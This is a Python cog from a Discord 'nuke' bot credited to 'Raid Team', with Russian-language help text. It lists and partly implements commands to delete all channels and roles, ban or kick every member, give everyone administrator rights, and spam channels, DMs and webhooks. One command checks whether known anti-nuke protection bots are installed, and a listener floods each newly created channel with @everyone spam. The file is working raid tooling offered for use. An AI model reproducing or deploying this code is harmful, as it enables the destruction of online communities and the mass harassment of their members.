# coding: utf-8
import os
import json
import time
import aiohttp
import asyncio
import discord
import subprocess
import datetime
from utils import *
from os import system, name
from discord.ext import commands
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


class Help(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Output a list of bot commands
    @commands.command()
    @commands.check(black_check)
    @commands.check(white_check)
    async def documentation(self, ctx):
        try:
            embed = discord.Embed(
                title = f'Инструкция как пользоваться краш ботом - список команд',
                description = f'`<>` - *Обязательный параметр.*  `[]` - *Необязательный параметр.*\n឵឵',
                color = 0x050319
            )
            embed.add_field(
                name = "Классические команды для взаимодействия с сервером",
                value = f"""឵឵
> `{ctx.prefix}attack` - Автоматический краш сервера.
> `{ctx.prefix}delchannels` - Удаление всех каналов.
> `{ctx.prefix}delroles` - Удаление всех ролей.
> `{ctx.prefix}channels` - Создание большого количества каналов.
> `{ctx.prefix}roles` - Создание большого количества ролей.
> `{ctx.prefix}rename` - Смена имени сервера.
> `{ctx.prefix}delemoji` - Удаление всех эмодзи сервера.\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Команды для взаимодействия с участниками",
                value = f"""឵឵
> `{ctx.prefix}kick_all` - Кик всех участников.
> `{ctx.prefix}ban_all` - Бан всех участнико.\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Команды для взаимодействия с ролями",
                value = f"""឵឵
> `{ctx.prefix}admin` - Выдёт вам администратора.**
> `{ctx.prefix}everyone_admin` - Выдаёт всем участникам сервера роли администратора.**\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Команы для вызова спама и флуда",
                value = f"""឵឵
> `{ctx.prefix}spam` - Спам в один канал.
> `{ctx.prefix}allspam` - Спам во все каналы.
> `{ctx.prefix}wepbhook_spam` - Спам через вебхуки.
> `{ctx.prefix}dmspam <@Ping | ID>` - Спам в личные сообщения упомянутого участника.\n឵឵""",
                inline = False
            )
#             embed.add_field(
#                 name = "Custom commands for interacting with the server",
#                 value = f"""឵឵
# > `{ctx.prefix}customchan <Count | Name>` - Создание каналов с введённым вами именем.
# > `{ctx.prefix}customroles <Count | Name>` - Создание каналов с введённым вами именем.
# > `{ctx.prefix}customspam <Count | Text>` - Спам вашими сообщениями.
# > `{ctx.prefix}customname <Name>` - Изменение имени сервера на ваше.\n឵឵""",
#                 inline = False
#             )
            embed.set_footer( 
                text = "Janek#2549 | Raid Team - All rights reserved!"
            )
            await ctx.send(embed=embed)
        except Exception as e: print(e)



    # Output of information about the server
    @commands.command()
    @commands.check(black_check)
    @commands.check(white_check)
    async def information(self, ctx):
        try:
            embed = discord.Embed(
                title = f'| Information about server "{ctx.guild.name}"',
                description = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **All users:** `{len(ctx.guild.members)}`
> **All channels:** `{len(ctx.guild.channels)}`
> **All roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`

> **Text Channels:** `{len(ctx.guild.text_channels)}`
> **Voice Channels:** `{len(ctx.guild.voice_channels)}`
> **Categories:** `{len(ctx.guild.categories)}`

> **All users:** `{len(ctx.guild.members)}`
> **People:** `{len([m for m in ctx.guild.members if not m.bot])}`
> **Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
> **Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
> **Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`

> **All roles:** `{len(ctx.guild.roles)}`
> **Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
> **Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`

> **AR-Protect:** `{958655045698736158 in [m.id for m in ctx.guild.members if m.bot]}`
> **Lavan:** `{704967695036317777 in [m.id for m in ctx.guild.members if m.bot]}`
> **Vega:** `{795551166393876481 in [m.id for m in ctx.guild.members if m.bot]}`
> **Wick:** `{536991182035746816 in [m.id for m in ctx.guild.members if m.bot]}`
> **Nue:** `{1053378220948471918 in [m.id for m in ctx.guild.members if m.bot]}`
> **K-Protect:** `{1025731593584791663 in [m.id for m in ctx.guild.members if m.bot]}`

```py
False - The anti-nuke bot is missing.  True - The anti-nuke bot is present.
```
""",
                color = 0x050404
            )
            embed.set_footer( 
                text = "Janek#2549 | Raid Team - All rights reserved!"
            )
            await ctx.author.send(embed=embed)
        except Exception as e: print(e)



    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        try:
            try:
                with open("json/white_list.json", 'r', encoding="utf-8") as wl:
                    white_list = json.load(wl)
            except Exception as e: print(e)

            if guild.id in white_list:
                await guild.leave()
            else:
                pass
        except Exception as e: print(e)



    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            embed = discord.Embed(
                title = 'Кулдаун команды',
                description = f"> {ctx.author.mention}, вы уже использовали `{ctx.message.content}`. Вы сможете её использовать через `{error.retry_after}` секунд.",
                color = 0x050404
            )
            await ctx.author.send(embed=embed)
        else:
            pass


    """ Documentation: What is a 'on_guild_channels_create'?

This event allows the bot to immediately respond to the creation of new channels on the server.
This is necessary for the complete neutralization of the server administration (spam causes severe inhibitions)
and a powerful PR company of your server/group/community through this bot. 

This event works especially effectively after using the following commands:

・ !attack - Automatic server destruction.

・ !channels - Mass creation of spam-channels.

・ !customchan <Count | Name> - Mass creation of channels with the specified name.

The three above-mentioned commands create a large number of channels, which causes an immediate reaction
of the bot in the form of mass spam. If the server is destroyed, try not to manually create separate channels,
as this will also cause an immediate reaction of the bot, but it will not cause any damage to the server.

    """


    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):

        embed = discord.Embed(
            title = f'''Вы были крашнуты Raid Team''',
            description = f'''{spam_text}''',
            color = 0x050404
        )
#        embed.set_image(url='https://media.discordapp.net/attachments/1083690678837588068/1090698201553707100/IMG_6839.gif') 

        try:
            webhook = await channel.create_webhook(name=nuke_webhook_name)
            webhook_url = webhook.url
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
                for i in range(5):
                    await webhook.send(f'@everyone', embed=embed)

        except:
            try:
                for i in range(5):
                    await channel.send(f'@everyone', embed=embed)
            except:
                pass





async def setup(client):
    await client.add_cog(Help(client))